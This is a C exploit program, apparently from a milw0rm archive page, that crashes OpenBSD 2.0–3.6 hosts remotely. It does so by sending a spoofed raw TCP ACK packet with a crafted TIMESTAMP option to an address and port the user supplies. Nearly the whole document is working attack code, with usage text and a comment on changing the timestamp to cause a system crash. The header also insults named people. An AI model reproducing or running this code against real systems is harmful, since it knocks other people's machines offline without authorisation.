<html>
<head>
<title>OpenBSD 2.0 - 3.6 TCP TIMESTAMP Remote Denial of Service Exploit</title>
</head>
<pre>
#define _BSD_SOURCE

#include &lt;stdio.h&gt; 
#include &lt;ctype.h&gt; 
#include &lt;sys/socket.h&gt; 
#include &lt;netinet/in.h&gt; 
#include &lt;netinet/in_systm.h&gt; 
#include &lt;netinet/ip.h&gt; 
#include &lt;netinet/tcp.h&gt; 
#include &lt;sysexits.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;unistd.h&gt; 
#include &lt;sys/types.h&gt; 
/* edited by /str0ke ! milw0rm.com to compile under linux */
#ifndef TCPOPTLEN 
 #define TCPOPTLEN 12 
#endif 
#define UMASK 0xffff 
#define TIMESTAMP 0x7b000000 // 123 in hex - change it, this will probably help 
                             // ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.6/common/010_rtt.patch 

/* 
ANY MODIFIED REPUBLISHING IS RESTRICTED 
OpenBSD 2.0 - 3.6 Remote DoS Exploit 
Tested under OpenBSD 3.6 at OpenBSD 3.5/3.6 
Vuln by OpenBSD errata, http://www.openbsd.org/errata.html 
(c)oded by __blf 2005 RusH Security Team, http://rst.void.ru 
Public version - change TimeStamp to cause System Crash 
Gr33tz: zZz, Phoenix, MishaSt, Inck-Vizitor, BlackPrince 
Fuck lamerz: Saint_I, nmalykh, Mr.Clumsy, RooD aka MapycyA 
All rights reserved. 
ANY MODIFIED REPUBLISHING IS RESTRICTED 
*/

u_short checksum(unsigned short * addr, int len) 
{ 
u_int32_t cksum  = 0; 
while(len &gt; 0) 
{ 
cksum += *addr++; 
len -= 2; 
} 
if(len == 0) 
{ 
cksum += *(u_char *)addr; 
} 
cksum = (cksum &gt;&gt; 16) + (cksum &amp; UMASK); 
cksum = cksum + (cksum &gt;&gt; 16); 
return (~cksum); 
} 

int main(int argc, char ** argv) 
{ 
struct in_addr src, dst; 
struct sockaddr_in sin; 
struct ip * iph; 
struct tcphdr * tcph; 
struct _pseudoheader { 
struct in_addr src_addr; 
struct in_addr dest_addr; 
u_char zero; 
u_char protocol; 
u_short length; 
} pseudoheader; 
u_char * packet; 
u_char * pseudopacket; 
int mysock; 
int on = 1; 
u_char * ts; u_int32_t val = TIMESTAMP; 
if( argc != 4) 
{ 
fprintf(stderr, &quot;r57obsd-dos.c by __blf\n&quot;); 
fprintf(stderr, &quot;RusH Security Team\n&quot;); 
fprintf(stderr, &quot;Usage: %s &lt;source ip&gt; &lt;dest ip&gt; &lt;dest port&gt;\n&quot;, argv[0]); 
return EX_USAGE; 
} 
if ((packet = (char *)malloc(sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN)) == NULL) 
{ 
perror(&quot;malloc&quot;); 
return EX_OSERR; 
} 
inet_aton(argv[1], &amp;src); 
inet_aton(argv[2], &amp;dst); 
iph = (struct ip *) packet; 
iph-&gt;ip_v = IPVERSION; 
iph-&gt;ip_hl = 5; 
iph-&gt;ip_tos = 0; 
iph-&gt;ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN); 
iph-&gt;ip_off = htons(IP_DF); 
iph-&gt;ip_ttl = 255; 
iph-&gt;ip_p = IPPROTO_TCP; 
iph-&gt;ip_sum = 0; 
iph-&gt;ip_src = src; 
iph-&gt;ip_dst = dst; 
tcph = (struct tcphdr *)(packet +sizeof(struct ip)); 
tcph-&gt;th_sport = htons(rand()); // just random 
tcph-&gt;th_dport = htons(atoi(argv[3])); 
tcph-&gt;th_seq = htonl(rand()); 
tcph-&gt;th_ack = htonl(rand()); 
tcph-&gt;th_off = 5 + (TCPOPTLEN &gt;&gt; 2); 
tcph-&gt;th_flags = TH_ACK; 
tcph-&gt;th_win = htons(512); 
tcph-&gt;th_urp = 0; 
ts = (unsigned char *)(packet + sizeof(struct ip) + sizeof(struct tcphdr)); 
ts[0] = ts[1] = 1; 
ts[2] = 8; 
ts[3] = 10; 
memcpy(ts+4, &amp;val, 4); 
memset(ts+8, 0, 4); 
pseudoheader.src_addr = src; 
pseudoheader.dest_addr = dst; 
pseudoheader.zero = 0; 
pseudoheader.protocol = IPPROTO_TCP; 
pseudoheader.length = htons(sizeof(struct tcphdr) + TCPOPTLEN); 
if((pseudopacket = (char *)malloc(sizeof(pseudoheader)+sizeof(struct tcphdr) + TCPOPTLEN)) == NULL) 
{ 
perror(&quot;malloc()&quot;); 
return EX_OSERR; 
} 
memcpy(pseudopacket, &amp;pseudoheader, sizeof(pseudoheader)); 
memcpy(pseudopacket + sizeof(pseudoheader), packet + sizeof(struct ip), sizeof(struct tcphdr) + TCPOPTLEN); 
tcph-&gt;th_sum = checksum((unsigned short *)pseudopacket, sizeof(pseudoheader) + sizeof(struct tcphdr) + TCPOPTLEN); 
mysock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW); 
if(!mysock) 
{ 
perror(&quot;socket!\n&quot;); 
return EX_OSERR; 
} 
if(setsockopt(mysock, IPPROTO_IP, IP_HDRINCL, (char *)&amp;on, sizeof(on)) == -1) 
{ 
perror(&quot;setsockopt&quot;); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
sin.sin_family = PF_INET; 
sin.sin_addr = dst; 
sin.sin_port = htons(atoi(argv[3])); // doesn't really matter 
if(sendto(mysock, packet, sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN, 0, (struct sockaddr *)&amp;sin, sizeof(sin)) == -1) 
{ 
perror(&quot;sendto()\n&quot;); 
shutdown(mysock, 2); 
return EX_NOHOST; 
} 
printf(&quot;Packet sent. Remote machine should crash.\n&quot;); 
shutdown(mysock, 2); 
return  EX_OK; 
} 

// milw0rm.com [2005-03-09]
</pre>
</html>

